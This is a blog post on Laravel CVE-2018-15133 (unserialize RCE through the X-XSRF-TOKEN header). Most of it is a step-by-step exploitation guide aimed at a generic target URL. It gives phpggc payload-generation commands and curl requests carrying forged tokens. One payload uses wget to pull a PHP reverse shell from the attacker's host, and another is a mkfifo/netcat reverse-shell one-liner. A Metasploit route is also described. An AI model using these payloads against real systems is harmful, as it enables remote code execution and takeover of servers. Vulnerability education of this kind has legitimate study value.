<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Laravel CVE-2018-15133</title><meta name="description" content="Infosec Blog"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="What is the vulnerabilityIn Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value.This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc.The attacker .."><meta name="generator" content="Hexo 5.4.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">vulnfreak's blog</a></h2></section><h3 class="is-hidden-mobile is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Laravel CVE-2018-15133</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-is-the-vulnerability"><span class="toc-text">What is the vulnerability</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#How-Attack-work"><span class="toc-text">How Attack work</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#How-to-exploit-To-Get-Shell-On-the-Server"><span class="toc-text">How to exploit To Get Shell On the Server</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#By-MSFCONSOLE"><span class="toc-text">By MSFCONSOLE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Now-we-will-do-all-these-things-manually-%F0%9F%98%8E"><span class="toc-text">Now we will do all these things manually ðŸ˜Ž</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Uploading-Shell-to-the-server"><span class="toc-text">Uploading Shell to the server</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sendind-the-shell-command-to-the-server"><span class="toc-text">Sendind the shell command to the server</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CyberSecurity"><i class="tag post-item-tag">CyberSecurity</i></a><a href="/tags/CVE-2018-15133"><i class="tag post-item-tag">CVE-2018-15133</i></a><a href="/tags/Laravel"><i class="tag post-item-tag">Laravel</i></a><a href="/tags/unserialize"><i class="tag post-item-tag">unserialize</i></a></header><h1 class="mt-0 mb-1" id="postTitle">Laravel CVE-2018-15133</h1><time class="has-text-grey" datetime="2021-02-08T18:27:00.000Z">2021-02-08</time><article class="mt-2 post-content"><h1 id="What-is-the-vulnerability"><a href="#What-is-the-vulnerability" class="headerlink" title="What is the vulnerability"></a>What is the vulnerability</h1><p>In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value.<br>This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc.<br>The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.</p>
<p>It means vulnerability is that it unserialize the X-XSRF Token it recived from the client side and attacker can also send the *unix commands to it and will also excute them. It will lead to the RCE ( Remote Code Excution )</p>
<h1 id="How-Attack-work"><a href="#How-Attack-work" class="headerlink" title="How Attack work"></a>How Attack work</h1><ul>
<li>In Laravel we have Encrypter.php that decrypt the decoded the X-XSRF Token sent from the client side with the help of the Applictaion Key i.e, APP_KEY </li>
<li>After that chain.php in phpggc which will unserallize the decoded token from itâ€™s base64 format.</li>
</ul>
<h1 id="How-to-exploit-To-Get-Shell-On-the-Server"><a href="#How-to-exploit-To-Get-Shell-On-the-Server" class="headerlink" title="How to exploit To Get Shell On the Server"></a>How to exploit To Get Shell On the Server</h1><p>There are Three Ways By which you can take shell on the server </p>
<ul>
<li>By MSFCONSOLE</li>
<li>By Uploading shell</li>
<li>By sending reverse shell command to the server </li>
</ul>
<h1 id="By-MSFCONSOLE"><a href="#By-MSFCONSOLE" class="headerlink" title="By MSFCONSOLE"></a>By MSFCONSOLE</h1><p>We will first search for the laravel in the msfconsole</p>
<p><img src="/assets/laravel/msf-search.png" alt="msf search"></p>
<p>After that set all the options required then run </p>
<p><img src="/assets/laravel/options_msf.png" alt="msf options"></p>
<p>We got the shell easily</p>
<p><img src="/assets/laravel/run_msf.png" alt="msf search"></p>
<p>This is the easiest way to get the shell</p>
<h1 id="Now-we-will-do-all-these-things-manually-ðŸ˜Ž"><a href="#Now-we-will-do-all-these-things-manually-ðŸ˜Ž" class="headerlink" title="Now we will do all these things manually ðŸ˜Ž"></a>Now we will do all these things manually ðŸ˜Ž</h1><p>For this we will use soem scripts </p>
<p><a target="_blank" rel="noopener" href="https://github.com/kozmic/laravel-poc-CVE-2018-15133">To Generate X-XSRF Token</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc"> To Generate serialize Payload </a></p>
<h1 id="Uploading-Shell-to-the-server"><a href="#Uploading-Shell-to-the-server" class="headerlink" title="Uploading Shell to the server"></a>Uploading Shell to the server</h1><p>So First we will check the manual process working </p>
<p><strong>We will first generate the base64 unserialize payload</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Laravel/RCE1 system <span class="string">&#x27;uname -a&#x27;</span> -b</span><br></pre></td></tr></table></figure>

<p>So it will generate the payload having command <code>uname -a</code></p>
<p><img src="/assets/laravel/serialize.png" alt="serialize"></p>
<p>Our second step is to generate the X-XSRF Token </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cve-2018-15133.php &lt;APP_KEY&gt; &lt;Serialize_Payload&gt; </span><br></pre></td></tr></table></figure>

<p><img src="/assets/laravel/token.png" alt="token"></p>
<p>Now we will will send this Token to the site using curl</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &lt;URL&gt; -X POST -H &#39;X-XSRF-TOKEN: &lt;TOKEN&gt;&#39; | head -n 3</span><br></pre></td></tr></table></figure>

<p><img src="/assets/laravel/curl.png" alt="curl"></p>
<p>In this we can see we recieve the result for the uname -a</p>
<p>Now we will upload the shell to the server.</p>
<p>Steps </p>
<ul>
<li><p>Downlaod the PHP shell from the <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">LINK</a></p>
</li>
<li><p>Generate The Serialize Payload</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Laravel/RCE1 system <span class="string">&#x27;wget http://LOCAL_IP:8000/shell.php;&#x27;</span> -b</span><br></pre></td></tr></table></figure>

<ul>
<li><p>With this we create a X-XSRF Token</p>
</li>
<li><p>Start the python server on your terminal</p>
</li>
</ul>
<p><img src="/assets/laravel/python.png" alt="Python Server"></p>
<ul>
<li>Send the Token to the server using curl</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &lt;URL&gt; -X POST -H &#39;X-XSRF-TOKEN: &lt;TOKEN&gt;&#39; | head -n 3</span><br></pre></td></tr></table></figure>

<p>so it will download the shell.php from our local system and after that we will acess the shell.php and we get the shell</p>
<p><img src="/assets/laravel/nc_shell.png" alt="nc_shell"></p>
<h1 id="Sendind-the-shell-command-to-the-server"><a href="#Sendind-the-shell-command-to-the-server" class="headerlink" title="Sendind the shell command to the server"></a>Sendind the shell command to the server</h1><p>In this we will not upload the shell we will use the netcat </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Laravel/RCE1 system <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP PORT &gt;/tmp/f;&#x27;</span> -b</span><br></pre></td></tr></table></figure>

<p>After This follow the same process as in the shell uplod you will get your shell</p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021-02-09-bitcracker/" title="BitLocker Password Crack"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: BitLocker Password Crack</span></a><a class="button is-default" href="/2021-02-08-Why-MKTEMP-is-UNSAFE/" title="Why MKTEMP is UNSAFE"><span class="has-text-weight-semibold">Next: Why MKTEMP is UNSAFE</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/vulnfreak"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/vulnfreak"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com/vulnfreak"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- çŸ¥ä¹Ž--><!-- é¢†è‹±--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/company/71482834/"><i class="iconfont icon-linkedin"></i></a><!-- è„¸ä¹¦--></section><p><span>Copyright Â©</span><span> vulnfreak 2021</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>